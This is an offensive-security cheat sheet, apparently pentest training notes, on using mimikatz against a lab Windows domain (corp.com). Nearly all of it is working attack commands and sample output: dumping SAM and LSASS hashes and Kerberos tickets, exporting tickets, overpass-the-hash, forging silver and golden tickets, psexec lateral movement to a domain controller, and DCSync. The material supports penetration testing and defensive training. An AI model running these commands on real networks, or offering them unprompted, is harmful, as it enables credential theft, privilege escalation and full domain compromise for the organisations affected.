---
Description: It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.
URL: https://github.com/ParrotSec/mimikatz
---

>[!tip]
>Check out the meterpreter version: [msfconsole](msfconsole.md) > [Kiwi](msfconsole.md)
>Check out the [old versions](https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip) (solve the `ERROR kuhl_m_sekurlsa_acquireLSA ; Key import` problem)

### Dumping local user from LSASS

```powershell
C:\> C:\Tools\password_attacks\mimikatz.exe
...
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM
740 {0;000003e7} 1 D 33697 NT AUTHORITY\SYSTEM S-1-5-18
(04g,21p) Primary
-> Impersonated !
* Process Token : {0;0002e0fe} 1 F 3790250 corp\offsec S-1-5-21-3048852426-
3234707088-723452474-1103 (12g,24p) Primary
* Thread Token : {0;000003e7} 1 D 3843007 NT AUTHORITY\SYSTEM S-1-5-18
(04g,21p) Impersonation (Delegation)
mimikatz # lsadump::sam
Domain : CLIENT251
SysKey : 457154fe3c13064d8ce67ff93a9257cf
Local SID : S-1-5-21-3426091779-1881636637-1944612440
SAMKey : 9b60bd58cdfd663166e8624f20a9a6e5
RID : 000001f4 (500)
User : Administrator
RID : 000001f5 (501)
User : Guest
RID : 000001f7 (503)
User : DefaultAccount
RID : 000001f8 (504)
User : WDAGUtilityAccount
Hash NTLM: 0c509cca8bcd12a26acf0d1e508cb028
RID : 000003e9 (1001)
User : Offsec
Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
```

### Dumping domain user from LSASS

```powershell
C:\Tools\active_directory> mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
Authentication Id : 0 ; 291668 (00000000:00047354)
Session : Interactive from 1
User Name : Offsec
Domain : CORP
Logon Server : DC01
Logon Time : 08/02/2018 14.23.26
SID : S-1-5-21-1602875587-2787523311-2599479668-1103
msv :
[00000003] Primary
\* Username : Offsec
\* Domain : CORP
\* NTLM : e2b475c11da2a0748290d87aa966c327
\* SHA1 : 8c77f430e4ab8acb10ead387d64011c76400d26e
\* DPAPI : 162d313bede93b0a2e72a030ec9210f0
tspkg :
wdigest :
\* Username : Offsec
\* Domain : CORP
\* Password : (null)
kerberos :
\* Username : Offsec
\* Domain : CORP.COM
\* Password : (null)
...
```

### Dumping tickets from LSASS

```powershell
mimikatz # sekurlsa::tickets
Authentication Id : 0 ; 291668 (00000000:00047354)
Session : Interactive from 1
User Name : Offsec
Domain : CORP
Logon Server : DC01
Logon Time : 08/02/2018 14.23.26
SID : S-1-5-21-1602875587-2787523311-2599479668-1103
* Username : Offsec
* Domain : CORP.COM
* Password : (null)
Group 0 - Ticket Granting Service
[00000000]
Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47
Service Name (02) : cifs ; dc01 ; @ CORP.COM
Target Name (02) : cifs ; dc01 ; @ CORP.COM
Client Name (01) : Offsec ; @ CORP.COM
Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
Session Key : 0x00000012 - aes256_hmac
d062a1b8c909544a7130652fd4bae4c04833c3324aa2eb1d051816a7090a0718
Ticket : 0x00000012 - aes256_hmac ; kvno = 3 [...]
Group 1 - Client Ticket ?
Group 2 - Ticket Granting Ticket
[00000000]
Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47
Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
Target Name (--) : @ CORP.COM
Client Name (01) : Offsec ; @ CORP.COM ( $$Delegation Ticket$$ )
Flags 60a10000 : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwa
Session Key : 0x00000012 - aes256_hmac
3b0a49af17a1ada1dacf2e3b8964ad397d80270b71718cc567da4d4b2b6dc90d
Ticket : 0x00000012 - aes256_hmac ; kvno = 2 [...]
[00000001]
Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47
Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
Target Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
Client Name (01) : Offsec ; @ CORP.COM ( CORP.COM )
Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forward
Session Key : 0x00000012 - aes256_hmac
8f6e96a7067a86d94af4e9f46e0e2abd067422fe7b1588db37c199f5691a749c
Ticket : 0x00000012 - aes256_hmac ; kvno = 2 [...]
...
```

Both a TGT and a TGS can be dumped. Stealing a TGS would allow us to access only particular resources associated with those tickets. On the other side, armed with a TGT ticket, we could request a TGS for specific resources we want to target within the domain.

### Exporting Kerberos Tickets

```powershell
mimikatz # kerberos::list /export
[00000000] - 0x00000012 - aes256_hmac
	Start/End/MaxRenew: 12/02/2018 10.17.53 ; 12/02/2018 20.17.53 ; 19/02/2018 10.17.53
	Server Name : krbtgt/CORP.COM @ CORP.COM
	Client Name : Offsec @ CORP.COM
	Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forward
	\* Saved to file : 0-40e10000-Offsec@krbtgt~CORP.COM-CORP.COM.kirbi
[00000001] - 0x00000017 - rc4_hmac_nt
	Start/End/MaxRenew: 12/02/2018 10.18.31 ; 12/02/2018 20.17.53 ; 19/02/2018 10.17.53
	Server Name : HTTP/CorpWebServer.corp.com @ CORP.COM
	Client Name : Offsec @ CORP.COM
	Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
	\* Saved to file : 1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

### Overpass the Hash (NTLM —> Kerberos)

```powershell
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
user : jeff_admin
domain : corp.com
program : cmd.exe
impers. : no
NTLM : e2b475c11da2a0748290d87aa966c327
| PID 4832
| TID 2268
| LSA Process is now R/W
| LUID 0 ; 1197687 (00000000:00124677)
\_ msv1_0 - data copy @ 040E5614 : OK !
\_ kerberos - data copy @ 040E5438
\_ aes256_hmac -> null
\_ aes128_hmac -> null
\_ rc4_hmac_nt OK
\_ rc4_hmac_old OK
\_ rc4_md4 OK
\_ rc4_hmac_nt_exp OK
\_ rc4_hmac_old_exp OK
\_ *Password replace -> null
```

### Craft a Silver Ticket

```powershell
C:\>whoami /user		# SID Extraction
USER INFORMATION
----------------
User Name SID
=========== ==============================================
corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103		# Domain SID is S-1-5-21-1602875587-2787523311-2599479668 without 1103

mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

User : offsec
Domain : corp.com (CORP)
SID : S-1-5-21-1602875587-2787523311-2599479668
User Id : 500
Groups Id : \*513 512 520 518 519
ServiceKey: e2b475c11da2a0748290d87aa966c327 - rc4_hmac_nt
Service : HTTP
Target : CorpWebServer.corp.com
Lifetime : 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
-> Ticket : \*\* Pass The Ticket \*\*
\* PAC generated
\* PAC signed
\* EncTicketPart generated
\* EncTicketPart encrypted
\* KrbCred generated
Golden ticket for 'offsec @ corp.com' successfully submitted for current session
```

`/ptt`: inject directly into memory
`/rc4`: is the password hash of the service account

### Craft a Golden Ticket

Extracting `krbtgt` hash:

```powershell
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668
RID : 000001f4 (500)
User : Administrator
LM :
NTLM : e2b475c11da2a0748290d87aa966c327
RID : 000001f5 (501)
User : Guest
LM :
NTLM :
RID : 000001f6 (502)
User : krbtgt
LM :
NTLM : 75b60230a2394a812000dbfad8415965
...
```

Crafting the custom TGT:

```powershell
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
User : fakeuser
Domain : corp.com (CORP)
SID : S-1-5-21-1602875587-2787523311-2599479668
User Id : 500
Groups Id : \*513 512 520 518 519
ServiceKey: 75b60230a2394a812000dbfad8415965 - rc4_hmac_nt
Lifetime : 14/02/2018 15.08.48 ; 12/02/2028 15.08.48 ; 12/02/2028 15.08.48
-> Ticket : \*\* Pass The Ticket \*\*
\* PAC generated
\* PAC signed
\* EncTicketPart generated
\* EncTicketPart encrypted
\* KrbCred generated
Golden ticket for 'fakeuser @ corp.com' successfully submitted for current session
```

Spawning the `cmd` with the TGT injected in memory and performing the Overpass the Hash:

```powershell
imikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24

C:\Users\offsec.crop> psexec.exe \\dc01 cmd.exe
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Windows\system32> whoami
corp\fakeuser
```

### User Replication Updates

```powershell
mimikatz # lsadump::dcsync /user:Administrator
[DC] 'corp.com' will be the domain
[DC] 'DC01.corp.com' will be the DC server
[DC] 'Administrator' will be the user account
Object RDN : Administrator
\*\* SAM ACCOUNT \*\*
SAM Username : Administrator
User Principal Name : Administrator@corp.com
Account Type : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration :
Password last change : 05/02/2018 19.33.10
Object Security ID : S-1-5-21-1602875587-2787523311-2599479668-500
Object Relative ID : 500
Credentials:
Hash NTLM: e2b475c11da2a0748290d87aa966c327
ntlm- 0: e2b475c11da2a0748290d87aa966c327
lm - 0: 913b84377b5cb6d210ca519826e7b5f5
Supplemental Credentials:
\* Primary:NTLM-Strong-NTOWF \*
Random Value : f62e88f00dff79bc79f8bad31b3ffa7d
\* Primary:Kerberos-Newer-Keys \*
Default Salt : CORP.COMAdministrator
Default Iterations : 4096
Credentials
aes256_hmac (4096): 4c6300b908619dc7a0788d
...
```